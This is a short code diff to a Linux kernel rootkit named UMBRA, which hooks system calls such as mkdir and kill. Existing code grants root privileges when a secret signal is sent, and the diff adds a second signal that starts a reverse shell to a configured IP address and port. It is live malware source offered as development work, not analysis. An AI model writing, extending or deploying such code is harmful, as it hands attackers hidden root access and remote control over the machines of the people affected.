@@ -1,4 +1,6 @@
 #include "../include/hookers.h"
+#include "../include/utils.h"
+#include "../include/CONFIG.h"
 
 asmlinkage long (*orig_mkdir)(const struct pt_regs*);
 asmlinkage int hook_mkdir(const struct pt_regs *regs){
@@ -24,10 +26,13 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
     void set_root(void);
     int sig = regs->si;
 
+    //If SIGNAL_KILL_HOOK, grant root privileges
     if (sig == SIGNAL_KILL_HOOK){
         printk(KERN_INFO "UMBRA:: Giving root privileges.\n");
         change_self_privileges_to_root();
         return 0;
+    }else if(sig == SIGNAL_REVERSE_SHELL){
+        start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
     }
 
     return orig_kill(regs);
